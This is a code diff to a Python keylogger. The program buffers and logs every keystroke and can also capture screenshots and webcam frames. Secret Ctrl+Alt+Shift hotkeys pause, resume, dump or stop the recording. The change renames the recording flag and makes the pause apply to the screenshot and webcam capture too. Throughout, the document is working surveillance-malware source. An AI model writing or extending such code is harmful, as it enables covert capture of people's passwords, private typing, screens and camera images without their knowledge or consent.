@@ -15,7 +15,7 @@ T_code = 84
 is_ctrl_pressed:bool = False
 is_alt_pressed:bool = False
 is_shift_pressed:bool = False
-should_register:bool = True
+is_not_paused:bool = True
 should_capture_screenshots:bool = False
 should_capture_webcam:bool = False
 screenshot_interval:int = 4
@@ -37,13 +37,13 @@ def on_pressed(key):
             __check_for_special_handling(ord(key.char))
         else:
             is_idle = False
-            if should_register:
+            if is_not_paused:
                 key_buffer.append(key.char)
     else:
         if __check_for_combination_key(key):
             return
 
-        if should_register:
+        if is_not_paused:
             if key == Key.space:
                 is_idle = False
                 key_buffer.append(" ")
@@ -88,12 +88,12 @@ def __check_for_combination_key(key) -> bool:
 
 def __check_for_special_handling(unicode):
     if is_alt_pressed and is_shift_pressed and is_ctrl_pressed:
-        global should_register,key_buffer
+        global is_not_paused,key_buffer
 
         if   unicode == P_code:     #stop recording and timers
-            should_register = False
+            is_not_paused = False
         elif unicode == S_code:     #start recording and timers again
-            should_register = True
+            is_not_paused = True
         elif unicode == D_code:     #force dump contents of array in file
             __log_buffer(is_dump=True)
         elif unicode == T_code:     #wait for log to complete if ongoing, and exit
@@ -113,23 +113,26 @@ def __log_buffer(is_dump:bool=False):
 
 def __check_for_new_characters():
     global is_idle
-    if not is_idle or len(key_buffer) == 0:
-        is_idle = True
-        return
+    if is_not_paused:
+        if not is_idle or len(key_buffer) == 0:
+            is_idle = True
+            return
 
-    __log_buffer(is_dump=True)
+        __log_buffer(is_dump=True)
 
 
 def __take_screenshot():
     global is_idle
-    if not is_idle:
-        screenshot.take_screenshot()
+    if is_not_paused:
+        if not is_idle:
+            screenshot.take_screenshot()
 
 
 def __make_cam_capture():
     global is_idle
-    if not is_idle:
-        camcapture.capture_cam_frame()
+    if is_not_paused:
+        if not is_idle:
+            camcapture.capture_cam_frame()
 
 
 def __exit_safely():
